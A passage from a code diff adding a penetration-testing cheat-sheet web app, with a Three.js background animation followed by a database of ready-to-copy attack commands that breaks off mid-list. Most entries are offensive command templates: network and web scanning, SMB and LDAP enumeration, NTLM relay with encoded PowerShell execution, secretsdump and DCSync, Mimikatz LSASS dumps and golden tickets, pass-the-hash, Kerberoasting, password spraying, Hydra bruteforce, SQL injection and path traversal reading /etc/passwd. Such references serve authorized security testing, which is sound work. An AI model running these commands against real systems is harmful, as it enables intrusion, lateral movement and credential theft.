+  sx.fillStyle=g;sx.beginPath();sx.arc(32,32,32,0,7);sx.fill();
+  var geo=new THREE.BufferGeometry();
+  geo.setAttribute('position',new THREE.BufferAttribute(pos,3));
+  geo.setAttribute('color',new THREE.BufferAttribute(col,3));
+  var mat=new THREE.PointsMaterial({size:1.5,map:new THREE.CanvasTexture(sc),vertexColors:true,transparent:true,opacity:.9,depthWrite:false,blending:THREE.AdditiveBlending});
+  group.add(new THREE.Points(geo,mat));
+  var mx=0,my=0;
+  window.addEventListener('mousemove',function(e){mx=(e.clientX/innerWidth)*2-1;my=-(e.clientY/innerHeight)*2+1;},{passive:true});
+  var t=0;
+  function loop(){
+    t+=0.006;
+    group.rotation.y+=0.0009;
+    camera.position.x+=(mx*6-camera.position.x)*0.03;
+    camera.position.y+=(my*4-camera.position.y)*0.03;
+    camera.lookAt(0,0,0);
+    for(var i=0;i<N;i++){
+      pos[i*3]=base[i*3]+Math.sin(t*0.6+i)*1.3;
+      pos[i*3+1]=base[i*3+1]+Math.cos(t*0.5+i*1.3)*1.3;
+      pos[i*3+2]=base[i*3+2]+Math.sin(t*0.4+i)*1.0;
+    }
+    geo.attributes.position.needsUpdate=true;
+    renderer.render(scene,camera);
+    requestAnimationFrame(loop);
+  }
+  loop();
+  window.addEventListener('resize',function(){camera.aspect=innerWidth/innerHeight;camera.updateProjectionMatrix();renderer.setSize(innerWidth,innerHeight);});
+  var glow=document.getElementById('bg-glow');
+  function hideForPrint(){try{if(canvas.parentNode)canvas.parentNode.removeChild(canvas);if(glow)glow.style.display='none';}catch(e){}}
+  function showAfterPrint(){try{if(!canvas.parentNode)document.body.insertBefore(canvas,document.body.firstChild);if(glow)glow.style.display='';}catch(e){}}
+  window.addEventListener('beforeprint',hideForPrint);
+  window.addEventListener('afterprint',showAfterPrint);
+  if(window.matchMedia){var mqp=window.matchMedia('print');var mqh=function(e){e.matches?hideForPrint():showAfterPrint();};if(mqp.addEventListener)mqp.addEventListener('change',mqh);else if(mqp.addListener)mqp.addListener(mqh);}
+})();
+
+/* ── TOAST ── */
+function showToast(msg){
+  var wrap=document.getElementById('toastWrap');
+  var el=document.createElement('div');
+  el.className='toast';
+  el.textContent=msg||'Copied!';
+  wrap.appendChild(el);
+  setTimeout(function(){ el.remove(); },1800);
+}
+
+/* ════════════════════════════════════════════
+   CHEAT DATABASE
+════════════════════════════════════════════ */
+var CATS=[
+  {id:'network',  label:'Network Scan',         dot:'#00d4ff'},
+  {id:'dirfuzz',  label:'Dir / Fuzz',            dot:'#a3e635'},
+  {id:'dns',      label:'DNS Enum',              dot:'#2dd4bf'},
+  {id:'smb',      label:'SMB Enum',              dot:'#ffa657'},
+  {id:'ldap',     label:'LDAP / AD Enum',        dot:'#c084fc'},
+  {id:'web',      label:'Web Recon',             dot:'#ffd54f'},
+  {id:'winrm',    label:'WinRM / RPC',           dot:'#f472b6'},
+  {id:'creds',    label:'Credential Attacks',    dot:'#ff3d3d'},
+  {id:'llmenum',  label:'AI / LLM Enum',         dot:'#a3e635'},
+  {id:'reporting',label:'Reporting',             dot:'#8a9fb5'},
+  {id:'services', label:'Services Enum',         dot:'#00e676'},
+  {id:'adcs',     label:'ADCS / Kerberos',       dot:'#00e676'},
+  {id:'cloud',    label:'Cloud / K8s / CI-CD',   dot:'#1a8cff'},
+  {id:'osint',    label:'OSINT / Supply Chain',  dot:'#ffd54f'},
+  {id:'screenshot',label:'Screenshot Recon',     dot:'#f472b6'},
+];
+
+var CHEATS=[
+  /* ── NETWORK SCAN ── */
+  {id:'n01',cat:'network',icon:'🔍',title:'Host Discovery Sweep',desc:'Identify live hosts on a subnet without port scanning',tags:['recon','enum'],variants:[
+    {name:'Ping sweep (ICMP)',cmd:'nmap -sn {IP}/24 --open'},
+    {name:'ARP sweep (local only)',cmd:'arp-scan --localnet\nnmap -PR -sn {IP}/24'},
+    {name:'No ping (firewall evasion)',cmd:'nmap -Pn -n {IP}/24 --open'},
+  ]},
+  {id:'n02',cat:'network',icon:'🔍',title:'Quick Top-1000 Ports',desc:'Fast TCP scan of the most common 1000 ports',tags:['recon','enum'],variants:[
+    {name:'Default top-1000',cmd:'nmap -sV -sC -T4 {IP}'},
+    {name:'With output to file',cmd:'nmap -sV -sC -T4 {IP} -oA ./nmap_{IP}'},
+  ]},
+  {id:'n03',cat:'network',icon:'🔍',title:'Full TCP Port Scan',desc:'All 65535 TCP ports — slow but comprehensive',tags:['recon','enum'],variants:[
+    {name:'All ports',cmd:'nmap -p- -T4 --min-rate=1000 {IP} -oN nmap_full.txt'},
+    {name:'Follow up on found ports',cmd:'nmap -sV -sC -p {PORT} {IP}'},
+  ]},
+  {id:'n04',cat:'network',icon:'🔍',title:'UDP Scan',desc:'Top 20 UDP ports — SNMP, DNS, NTP, etc.',tags:['recon'],variants:[
+    {name:'Top 20 UDP',cmd:'nmap -sU --top-ports 20 {IP}'},
+    {name:'UDP + service version',cmd:'sudo nmap -sU -sV --top-ports 100 {IP}'},
+  ]},
+  {id:'n05',cat:'network',icon:'🔍',title:'Vulnerability Scan',desc:'Run nmap NSE vuln scripts against a target',tags:['recon','enum'],variants:[
+    {name:'vuln scripts',cmd:'nmap --script=vuln {IP}'},
+    {name:'smb-vuln scripts',cmd:'nmap --script smb-vuln* -p 445 {IP}'},
+    {name:'Safe scripts only',cmd:'nmap -sV --script safe {IP}'},
+  ]},
+  {id:'n06',cat:'network',icon:'🔍',title:'Service Banner Grab',desc:'Banner grab on a specific port with netcat / curl',tags:['recon'],variants:[
+    {name:'netcat banner grab',cmd:'nc -nv {IP} {PORT}'},
+    {name:'curl headers',cmd:'curl -I http://{IP}:{PORT}'},
+    {name:'telnet grab',cmd:'telnet {IP} {PORT}'},
+  ]},
+  {id:'n07',cat:'network',icon:'🔍',title:'OS Detection',desc:'Fingerprint OS and kernel version',tags:['recon'],variants:[
+    {name:'OS + version detection',cmd:'sudo nmap -O -sV {IP}'},
+    {name:'Aggressive (includes traceroute)',cmd:'nmap -A {IP}'},
+  ]},
+  {id:'n08',cat:'network',icon:'🔍',title:'Network Sweep + Save',desc:'Full recon sweep saving results for reporting',tags:['recon','enum'],variants:[
+    {name:'All output formats',cmd:'nmap -sV -sC -p- -T4 {IP} -oA ./recon/{IP}_full'},
+    {name:'Grepable output',cmd:'nmap -sV {IP} -oG - | grep open'},
+  ]},
+
+  /* ── DIR / FUZZ ── */
+  {id:'d01',cat:'dirfuzz',icon:'📁',title:'Gobuster Dir Scan',desc:'Directory and file bruteforce with gobuster',tags:['recon','web'],variants:[
+    {name:'Basic dir scan',cmd:'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -t 40'},
+    {name:'With extensions',cmd:'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -x php,html,txt,bak -t 40'},
+    {name:'With cookies/auth',cmd:'gobuster dir -u http://{IP}:{PORT} -w {WORDLIST} -c "session={PASS}" -t 40'},
+    {name:'Subdomain mode',cmd:'gobuster dns -d {DOMAIN} -w {WORDLIST} -t 40'},
+  ]},
+  {id:'d02',cat:'dirfuzz',icon:'📁',title:'FFUF Fuzzing',desc:'Fast web fuzzer — directories, parameters, vhosts',tags:['recon','web'],variants:[
+    {name:'Directory fuzz',cmd:'ffuf -u http://{IP}:{PORT}/FUZZ -w {WORDLIST} -mc 200,301,302,403'},
+    {name:'Parameter fuzz (GET)',cmd:'ffuf -u http://{IP}:{PORT}/page?FUZZ=test -w {WORDLIST}'},
+    {name:'POST body fuzz',cmd:'ffuf -u http://{IP}:{PORT}/login -X POST -d "username=FUZZ&password={PASS}" -w {WORDLIST} -fc 302'},
+    {name:'VHost fuzz',cmd:'ffuf -u http://{IP}/ -H "Host: FUZZ.{DOMAIN}" -w {WORDLIST} -fs 0'},
+  ]},
+  {id:'d03',cat:'dirfuzz',icon:'📁',title:'Feroxbuster Recursive',desc:'Recursive dir scan with auto-depth detection',tags:['recon','web'],variants:[
+    {name:'Recursive scan',cmd:'feroxbuster -u http://{IP}:{PORT} -w {WORDLIST} --depth 3'},
+    {name:'With extensions + filter',cmd:'feroxbuster -u http://{IP}:{PORT} -w {WORDLIST} -x php,asp,aspx --filter-status 404'},
+  ]},
+  {id:'d04',cat:'dirfuzz',icon:'📁',title:'Dirsearch',desc:'Python-based directory scanner with built-in wordlists',tags:['recon','web'],variants:[
+    {name:'Basic scan',cmd:'dirsearch -u http://{IP}:{PORT}'},
+    {name:'With extension list',cmd:'dirsearch -u http://{IP}:{PORT} -e php,asp,aspx,js,txt'},
+    {name:'With proxy',cmd:'dirsearch -u http://{IP}:{PORT} --proxy http://127.0.0.1:8080'},
+  ]},
+  {id:'d05',cat:'dirfuzz',icon:'📁',title:'API Endpoint Fuzz',desc:'Fuzz API paths and versioned endpoints',tags:['web','recon'],variants:[
+    {name:'API path fuzz',cmd:'ffuf -u http://{IP}:{PORT}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api-endpoints.txt -mc 200,201,204,401,403'},
+    {name:'Version fuzz',cmd:'ffuf -u http://{IP}:{PORT}/api/vFUZZ/{DOMAIN} -w <(seq 1 10)'},
+  ]},
+  {id:'d06',cat:'dirfuzz',icon:'📁',title:'Wfuzz Parameter Discovery',desc:'Find hidden GET/POST parameters',tags:['web','enum'],variants:[
+    {name:'GET param discovery',cmd:'wfuzz -c -z file,{WORDLIST} --hc 404 "http://{IP}:{PORT}/page?FUZZ=test"'},
+    {name:'Hide empty responses',cmd:'wfuzz -c -z file,{WORDLIST} --hh 0 "http://{IP}:{PORT}/FUZZ"'},
+  ]},
+  {id:'d07',cat:'dirfuzz',icon:'📁',title:'Nikto Web Scan',desc:'Comprehensive web server vulnerability scanner',tags:['web','enum'],variants:[
+    {name:'Basic scan',cmd:'nikto -h http://{IP}:{PORT}'},
+    {name:'With auth',cmd:'nikto -h http://{IP}:{PORT} -id {USER}:{PASS}'},
+    {name:'SSL target',cmd:'nikto -h https://{IP}:{PORT} -ssl'},
+  ]},
+
+  /* ── DNS ENUM ── */
+  {id:'dns01',cat:'dns',icon:'🌐',title:'DNS Zone Transfer',desc:'Attempt AXFR zone transfer to dump all DNS records',tags:['enum','domain'],variants:[
+    {name:'dig AXFR',cmd:'dig axfr @{DC} {DOMAIN}'},
+    {name:'host command',cmd:'host -l {DOMAIN} {DC}'},
+    {name:'dnsclient (Windows)',cmd:'nslookup\nserver {DC}\nls -d {DOMAIN}'},
+  ]},
+  {id:'dns02',cat:'dns',icon:'🌐',title:'Subdomain Enumeration',desc:'Discover subdomains via bruteforce and passive recon',tags:['recon','domain'],variants:[
+    {name:'Amass passive',cmd:'amass enum -passive -d {DOMAIN}'},
+    {name:'Subfinder',cmd:'subfinder -d {DOMAIN} -o subdomains.txt'},
+    {name:'DNSrecon bruteforce',cmd:'dnsrecon -d {DOMAIN} -D {WORDLIST} -t brt'},
+    {name:'Gobuster DNS',cmd:'gobuster dns -d {DOMAIN} -w {WORDLIST} -t 40 --wildcard'},
+  ]},
+  {id:'dns03',cat:'dns',icon:'🌐',title:'DNS Record Enumeration',desc:'Pull all DNS record types from a domain',tags:['enum','domain'],variants:[
+    {name:'All records',cmd:'dig {DOMAIN} ANY @{DC}'},
+    {name:'MX records',cmd:'dig {DOMAIN} MX @{DC}'},
+    {name:'SRV records (AD)',cmd:'nslookup -type=SRV _ldap._tcp.{DOMAIN} {DC}'},
+    {name:'NS records',cmd:'dig {DOMAIN} NS'},
+  ]},
+  {id:'dns04',cat:'dns',icon:'🌐',title:'Reverse DNS Lookup',desc:'Identify hostnames from IP addresses',tags:['recon','enum'],variants:[
+    {name:'Single reverse lookup',cmd:'dig -x {IP} @{DC}'},
+    {name:'Bulk reverse (subnet)',cmd:'dnsrecon -r {IP}/24 -n {DC}'},
+  ]},
+  {id:'dns05',cat:'dns',icon:'🌐',title:'AD DNS Discovery',desc:'Find AD-specific DNS records (DCs, GCs, Kerberos)',tags:['enum','domain'],variants:[
+    {name:'Find DCs',cmd:'nslookup -type=SRV _ldap._tcp.dc._msdcs.{DOMAIN} {DC}'},
+    {name:'Find KDCs',cmd:'nslookup -type=SRV _kerberos._tcp.{DOMAIN} {DC}'},
+    {name:'Find Global Catalog',cmd:'nslookup -type=SRV _gc._tcp.{DOMAIN} {DC}'},
+  ]},
+  {id:'dns06',cat:'dns',icon:'🌐',title:'DNS Cache Snooping',desc:'Check if DNS server has cached specific domains',tags:['recon'],variants:[
+    {name:'Cache snoop',cmd:'nmap -sU -p 53 --script dns-cache-snoop --script-args "dns-cache-snoop.mode=timed,dns-cache-snoop.domains={DOMAIN}" {DC}'},
+  ]},
+
+  /* ── SMB ENUM ── */
+  {id:'smb01',cat:'smb',icon:'📂',title:'enum4linux Full Scan',desc:'Full SMB/LDAP enumeration — users, groups, shares, password policy',tags:['enum','smb'],variants:[
+    {name:'Full scan',cmd:'enum4linux -a {IP}'},
+    {name:'With credentials',cmd:'enum4linux -a -u {USER} -p {PASS} {IP}'},
+    {name:'enum4linux-ng (modern)',cmd:'enum4linux-ng -A {IP}'},
+  ]},
+  {id:'smb02',cat:'smb',icon:'📂',title:'SMBClient Share Access',desc:'List and access SMB shares',tags:['enum','smb'],variants:[
+    {name:'List shares (null session)',cmd:'smbclient -L //{IP}/ -N'},
+    {name:'List shares (with creds)',cmd:'smbclient -L //{IP}/ -U "{DOMAIN}\\{USER}%{PASS}"'},
+    {name:'Connect to share',cmd:'smbclient //{IP}/SHARE -U "{DOMAIN}\\{USER}%{PASS}"'},
+    {name:'Get all files recursively',cmd:'smbclient //{IP}/SHARE -U "{DOMAIN}\\{USER}%{PASS}" -c "recurse;prompt;mget *"'},
+  ]},
+  {id:'smb03',cat:'smb',icon:'📂',title:'CrackMapExec SMB',desc:'CME SMB enumeration, password spraying, execution',tags:['enum','smb','creds'],variants:[
+    {name:'Enumerate hosts',cmd:'crackmapexec smb {IP}/24'},
+    {name:'Check credentials',cmd:'crackmapexec smb {IP} -u {USER} -p {PASS}'},
+    {name:'Pass the Hash',cmd:'crackmapexec smb {IP} -u {USER} -H {HASH}'},
+    {name:'Dump SAM',cmd:'crackmapexec smb {IP} -u {USER} -p {PASS} --sam'},
+    {name:'Spider shares',cmd:'crackmapexec smb {IP} -u {USER} -p {PASS} --shares --spider'},
+  ]},
+  {id:'smb04',cat:'smb',icon:'📂',title:'SMB Signing Check',desc:'Check if SMB signing is disabled (relay attack surface)',tags:['enum','smb'],variants:[
+    {name:'nmap SMB signing',cmd:'nmap --script smb2-security-mode -p 445 {IP}'},
+    {name:'CME signing check',cmd:'crackmapexec smb {IP}/24 --gen-relay-list relay_targets.txt'},
+  ]},
+  {id:'smb05',cat:'smb',icon:'📂',title:'Impacket SMB Enum',desc:'Impacket tools for share access and execution',tags:['enum','smb'],variants:[
+    {name:'smbclient.py',cmd:'impacket-smbclient {DOMAIN}/{USER}:{PASS}@{IP}'},
+    {name:'List shares',cmd:'impacket-smbclient {DOMAIN}/{USER}:{PASS}@{IP} -k -no-pass'},
+    {name:'Execute command (psexec)',cmd:'impacket-psexec {DOMAIN}/{USER}:{PASS}@{IP}'},
+    {name:'WMI execution',cmd:'impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}'},
+  ]},
+  {id:'smb06',cat:'smb',icon:'📂',title:'NTLM Relay Setup',desc:'Set up Responder + NTLMRelayX for credential capture',tags:['enum','exploit','creds'],variants:[
+    {name:'Start Responder (no SMB/HTTP)',cmd:'sudo responder -I eth0 -dPv'},
+    {name:'NTLMRelayX to target',cmd:'impacket-ntlmrelayx -tf relay_targets.txt -smb2support'},
+    {name:'Relay + execute',cmd:'impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "powershell -enc {PASS}"'},
+  ]},
+  {id:'smb07',cat:'smb',icon:'📂',title:'Secrets Dump',desc:'Dump NTLM hashes from SAM, LSA, NTDS.DIT',tags:['creds','exploit'],variants:[
+    {name:'Remote SAM dump',cmd:'impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP}'},
+    {name:'DCSync (domain admin)',cmd:'impacket-secretsdump -just-dc {DOMAIN}/{USER}:{PASS}@{DC}'},
+    {name:'Pass the Hash dump',cmd:'impacket-secretsdump -hashes :{HASH} {DOMAIN}/{USER}@{IP}'},
+    {name:'Local SAM (after shell)',cmd:'reg save HKLM\\SAM sam.save\nreg save HKLM\\SYSTEM system.save\nimpacket-secretsdump LOCAL -sam sam.save -system system.save'},
+  ]},
+
+  /* ── LDAP / AD ENUM ── */
+  {id:'l01',cat:'ldap',icon:'🏢',title:'LDAP Anonymous Enum',desc:'Query LDAP without credentials for domain info',tags:['enum','domain'],variants:[
+    {name:'Anonymous LDAP query',cmd:'ldapsearch -x -H ldap://{DC} -b "DC={DOMAIN}" "(objectClass=*)" | head -100'},
+    {name:'User enumeration',cmd:'ldapsearch -x -H ldap://{DC} -b "DC={DOMAIN}" "(objectClass=user)" sAMAccountName'},
+    {name:'All users with attributes',cmd:'ldapsearch -x -H ldap://{DC} -b "DC={DOMAIN}" "(&(objectClass=user)(objectCategory=person))" sAMAccountName description memberOf'},
+  ]},
+  {id:'l02',cat:'ldap',icon:'🏢',title:'LDAP Authenticated Enum',desc:'Deep LDAP queries with valid credentials',tags:['enum','domain'],variants:[
+    {name:'Groups enum',cmd:'ldapsearch -x -H ldap://{DC} -D "{USER}@{DOMAIN}" -w {PASS} -b "DC={DOMAIN}" "(objectClass=group)" cn member'},
+    {name:'Domain admins',cmd:'ldapsearch -x -H ldap://{DC} -D "{USER}@{DOMAIN}" -w {PASS} -b "DC={DOMAIN}" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC={DOMAIN}))"'},
+    {name:'AS-REP roastable users',cmd:'ldapsearch -x -H ldap://{DC} -D "{USER}@{DOMAIN}" -w {PASS} -b "DC={DOMAIN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName'},
+    {name:'Kerberoastable (SPN users)',cmd:'ldapsearch -x -H ldap://{DC} -D "{USER}@{DOMAIN}" -w {PASS} -b "DC={DOMAIN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName'},
+  ]},
+  {id:'l03',cat:'ldap',icon:'🏢',title:'BloodHound Collection',desc:'Collect AD data for BloodHound attack path analysis',tags:['enum','domain'],variants:[
+    {name:'bloodhound-python (Linux)',cmd:'bloodhound-python -d {DOMAIN} -dc {DC} -u {USER} -p {PASS} -c All --zip'},
+    {name:'SharpHound (Windows)',cmd:'.\\SharpHound.exe -c All --domain {DOMAIN} --outputdirectory C:\\Temp\\bh'},
+    {name:'SharpHound stealth',cmd:'.\\SharpHound.exe -c DCOnly --throttle 1000 --jitter 20'},
+  ]},
+  {id:'l04',cat:'ldap',icon:'🏢',title:'PowerView AD Enum',desc:'PowerView recon — users, ACLs, GPOs, trusts',tags:['enum','domain'],variants:[
+    {name:'Get domain info',cmd:'Get-Domain -Domain {DOMAIN}'},
+    {name:'Get domain admins',cmd:'Get-DomainGroupMember -Identity "Domain Admins" -Domain {DOMAIN}'},
+    {name:'Find all admin sessions',cmd:'Find-DomainUserLocation -UserGroupIdentity "Domain Admins"'},
+    {name:'Get ACLs for user',cmd:'Get-DomainObjectAcl -Identity {USER} -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "Write|GenericAll"}'},
+    {name:'Find interesting ACEs',cmd:'Find-InterestingDomainAcl -ResolveGUIDs | Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights'},
+  ]},
+  {id:'l05',cat:'ldap',icon:'🏢',title:'Kerbrute User Enum',desc:'Enumerate valid AD users via Kerberos pre-auth errors',tags:['enum','kerberos'],variants:[
+    {name:'User enumeration (no creds)',cmd:'kerbrute userenum -d {DOMAIN} --dc {DC} {WORDLIST}'},
+    {name:'Password spray',cmd:'kerbrute passwordspray -d {DOMAIN} --dc {DC} users.txt {PASS}'},
+    {name:'Bruteforce single user',cmd:'kerbrute bruteuser -d {DOMAIN} --dc {DC} {WORDLIST} {USER}'},
+  ]},
+  {id:'l06',cat:'ldap',icon:'🏢',title:'Kerberoasting',desc:'Request service tickets for offline password cracking',tags:['kerberos','creds'],variants:[
+    {name:'Impacket GetUserSPNs',cmd:'impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -outputfile kerberoast.hash'},
+    {name:'Rubeus (Windows)',cmd:'.\\Rubeus.exe kerberoast /domain:{DOMAIN} /dc:{DC} /outfile:kerberoast.hash'},
+    {name:'Crack hashes',cmd:'hashcat -m 13100 kerberoast.hash {WORDLIST} --force'},
+  ]},
+  {id:'l07',cat:'ldap',icon:'🏢',title:'AS-REP Roasting',desc:'Request AS-REP tickets for accounts with no pre-auth',tags:['kerberos','creds'],variants:[
+    {name:'Impacket GetNPUsers',cmd:'impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {DC} -format hashcat -outputfile asrep.hash'},
+    {name:'With credentials',cmd:'impacket-GetNPUsers {DOMAIN}/{USER}:{PASS} -dc-ip {DC} -request -outputfile asrep.hash'},
+    {name:'Crack hashes',cmd:'hashcat -m 18200 asrep.hash {WORDLIST} --force'},
+  ]},
+
+  /* ── WEB RECON ── */
+  {id:'w01',cat:'web',icon:'🌍',title:'WhatWeb + Tech Detection',desc:'Identify CMS, frameworks, server versions',tags:['recon','web'],variants:[
+    {name:'WhatWeb aggressive',cmd:'whatweb -a 3 http://{IP}:{PORT}'},
+    {name:'curl header inspection',cmd:'curl -sI http://{IP}:{PORT} | grep -iE "server|x-powered-by|set-cookie|x-generator"'},
+  ]},
+  {id:'w02',cat:'web',icon:'🌍',title:'WAF Detection',desc:'Identify and fingerprint Web Application Firewalls',tags:['recon','web'],variants:[
+    {name:'wafw00f',cmd:'wafw00f http://{IP}:{PORT}'},
+    {name:'nmap WAF scripts',cmd:'nmap --script http-waf-detect,http-waf-fingerprint -p {PORT} {IP}'},
+  ]},
+  {id:'w03',cat:'web',icon:'🌍',title:'SSL/TLS Enumeration',desc:'Audit TLS config, ciphers, certificate info',tags:['recon','web'],variants:[
+    {name:'testssl.sh',cmd:'testssl --severity HIGH https://{IP}:{PORT}'},
+    {name:'sslscan',cmd:'sslscan {IP}:{PORT}'},
+    {name:'nmap ssl scripts',cmd:'nmap --script ssl-enum-ciphers,ssl-cert,ssl-heartbleed -p {PORT} {IP}'},
+    {name:'View cert details',cmd:'echo | openssl s_client -connect {IP}:{PORT} 2>/dev/null | openssl x509 -noout -text'},
+  ]},
+  {id:'w04',cat:'web',icon:'🌍',title:'Source + JS Analysis',desc:'Extract endpoints, secrets, and API keys from JavaScript',tags:['recon','web'],variants:[
+    {name:'LinkFinder (JS endpoints)',cmd:'python3 linkfinder.py -i http://{IP}:{PORT}/app.js -o cli'},
+    {name:'SecretFinder (keys in JS)',cmd:'python3 SecretFinder.py -i http://{IP}:{PORT} -e'},
+    {name:'gau (known URLs)',cmd:'gau {DOMAIN} | tee gau_urls.txt'},
+    {name:'waybackurls',cmd:'waybackurls {DOMAIN} | sort -u | tee wayback.txt'},
+  ]},
+  {id:'w05',cat:'web',icon:'🌍',title:'LFI / Path Traversal',desc:'Test for local file inclusion and directory traversal',tags:['web','exploit'],variants:[
+    {name:'Basic LFI test',cmd:'ffuf -u "http://{IP}:{PORT}/page?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200'},
+    {name:'Read /etc/passwd',cmd:'curl -s "http://{IP}:{PORT}/page?file=../../../../etc/passwd"'},
+  ]},
+  {id:'w06',cat:'web',icon:'🌍',title:'SQL Injection Testing',desc:'Automated SQLi detection and exploitation',tags:['web','exploit'],variants:[
+    {name:'sqlmap basic',cmd:'sqlmap -u "http://{IP}:{PORT}/page?id=1" --batch --level=3'},
+    {name:'sqlmap with POST',cmd:'sqlmap -u "http://{IP}:{PORT}/login" --data="user={USER}&pass={PASS}" --batch'},
+    {name:'sqlmap with cookie',cmd:'sqlmap -u "http://{IP}:{PORT}/page" --cookie="session={PASS}" --batch --dbs'},
+  ]},
+
+  /* ── WINRM / RPC ── */
+  {id:'wr01',cat:'winrm',icon:'💻',title:'Evil-WinRM Shell',desc:'WinRM remote PowerShell shell',tags:['lateral','shell'],variants:[
+    {name:'Password auth',cmd:'evil-winrm -i {IP} -u {USER} -p {PASS}'},
+    {name:'Pass the Hash',cmd:'evil-winrm -i {IP} -u {USER} -H {HASH}'},
+    {name:'With SSL',cmd:'evil-winrm -i {IP} -u {USER} -p {PASS} -S'},
+  ]},
+  {id:'wr02',cat:'winrm',icon:'💻',title:'RPCClient Enum',desc:'Enumerate users, groups, and domain info via RPC',tags:['enum','smb'],variants:[
+    {name:'Null session',cmd:'rpcclient -U "" -N {IP}'},
+    {name:'With credentials',cmd:'rpcclient -U "{USER}%{PASS}" {IP}'},
+    {name:'Enum users',cmd:'rpcclient -U "{USER}%{PASS}" {IP} -c "enumdomusers"'},
+    {name:'Enum groups',cmd:'rpcclient -U "{USER}%{PASS}" {IP} -c "enumdomgroups"'},
+  ]},
+  {id:'wr03',cat:'winrm',icon:'💻',title:'WMI Remote Execution',desc:'Execute commands via WMI remotely',tags:['lateral','shell'],variants:[
+    {name:'wmiexec (impacket)',cmd:'impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}'},
+    {name:'Pass the Hash',cmd:'impacket-wmiexec -hashes :{HASH} {DOMAIN}/{USER}@{IP}'},
+  ]},
+  {id:'wr04',cat:'winrm',icon:'💻',title:'DCOM Lateral Movement',desc:'Use DCOM objects for code execution',tags:['lateral'],variants:[
+    {name:'dcomexec',cmd:'impacket-dcomexec {DOMAIN}/{USER}:{PASS}@{IP} "cmd.exe /c whoami"'},
+    {name:'MMC20 DCOM',cmd:'impacket-dcomexec {DOMAIN}/{USER}:{PASS}@{IP} "cmd.exe /c {LHOST}" -object MMC20'},
+  ]},
+  {id:'wr05',cat:'winrm',icon:'💻',title:'CrackMapExec WinRM',desc:'CME WinRM for credential validation and execution',tags:['lateral','creds'],variants:[
+    {name:'Check WinRM access',cmd:'crackmapexec winrm {IP} -u {USER} -p {PASS}'},
+    {name:'Execute command',cmd:'crackmapexec winrm {IP} -u {USER} -p {PASS} -X "whoami /all"'},
+    {name:'Pass the Hash',cmd:'crackmapexec winrm {IP} -u {USER} -H {HASH}'},
+  ]},
+
+  /* ── CREDENTIAL ATTACKS ── */
+  {id:'c01',cat:'creds',icon:'🔑',title:'Hydra Bruteforce',desc:'Network service password bruteforce with Hydra',tags:['creds'],variants:[
+    {name:'SSH bruteforce',cmd:'hydra -l {USER} -P {WORDLIST} ssh://{IP}'},
+    {name:'HTTP POST form',cmd:'hydra -l {USER} -P {WORDLIST} {IP} http-post-form "/login:username=^USER^&password=^PASS^:Invalid"'},
+    {name:'FTP bruteforce',cmd:'hydra -l {USER} -P {WORDLIST} ftp://{IP}'},
+    {name:'RDP bruteforce',cmd:'hydra -l {USER} -P {WORDLIST} rdp://{IP}'},
+    {name:'SMB bruteforce',cmd:'hydra -l {USER} -P {WORDLIST} smb://{IP}'},
+  ]},
+  {id:'c02',cat:'creds',icon:'🔑',title:'Password Spray',desc:'Low-and-slow spray to avoid lockout',tags:['creds','domain'],variants:[
+    {name:'CME spray (SMB)',cmd:'crackmapexec smb {DC} -u users.txt -p {PASS} --continue-on-success'},
+    {name:'Kerbrute spray',cmd:'kerbrute passwordspray -d {DOMAIN} --dc {DC} users.txt {PASS}'},
+  ]},
+  {id:'c03',cat:'creds',icon:'🔑',title:'Hash Cracking',desc:'Offline hash cracking with hashcat and john',tags:['creds'],variants:[
+    {name:'NTLM (mode 1000)',cmd:'hashcat -m 1000 hashes.txt {WORDLIST}'},
+    {name:'NetNTLMv2 (mode 5600)',cmd:'hashcat -m 5600 netntlm.txt {WORDLIST}'},
+    {name:'Kerberoast TGS (mode 13100)',cmd:'hashcat -m 13100 kerb.hash {WORDLIST}'},
+    {name:'AS-REP (mode 18200)',cmd:'hashcat -m 18200 asrep.hash {WORDLIST}'},
+    {name:'john the ripper',cmd:'john --wordlist={WORDLIST} hashes.txt'},
+    {name:'Rule-based attack',cmd:'hashcat -m 1000 hashes.txt {WORDLIST} -r /usr/share/hashcat/rules/best64.rule'},
+  ]},
+  {id:'c04',cat:'creds',icon:'🔑',title:'Pass the Hash',desc:'Authenticate with NTLM hash without cracking',tags:['creds','lateral'],variants:[
+    {name:'impacket-psexec PTH',cmd:'impacket-psexec -hashes :{HASH} {DOMAIN}/Administrator@{IP}'},
+    {name:'CME PTH',cmd:'crackmapexec smb {IP} -u {USER} -H {HASH}'},
+    {name:'Mimikatz PTH (on box)',cmd:'mimikatz.exe "sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{HASH} /run:cmd.exe"'},
+  ]},
+  {id:'c05',cat:'creds',icon:'🔑',title:'Mimikatz Credential Dump',desc:'Dump credentials from LSASS on a Windows box',tags:['creds','privesc'],variants:[
+    {name:'Dump all from LSASS',cmd:'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"'},
+    {name:'DCSync attack',cmd:'mimikatz.exe "lsadump::dcsync /domain:{DOMAIN} /all /csv" "exit"'},
+    {name:'Golden ticket',cmd:'mimikatz.exe "kerberos::golden /domain:{DOMAIN} /sid:S-1-5-21-XXX /krbtgt:{HASH} /user:Administrator /ptt" "exit"'},
+  ]},
+  {id:'c06',cat:'creds',icon:'🔑',title:'Credential Files Search',desc:'Find credential files on a compromised system',tags:['creds','privesc'],variants:[
+    {name:'Windows cred files',cmd:'findstr /si password *.txt *.xml *.ini *.config'},
+    {name:'Linux cred search',cmd:'grep -rn "password\\|passwd\\|secret\\|key" /etc /home --include="*.conf" --include="*.txt" 2>/dev/null'},
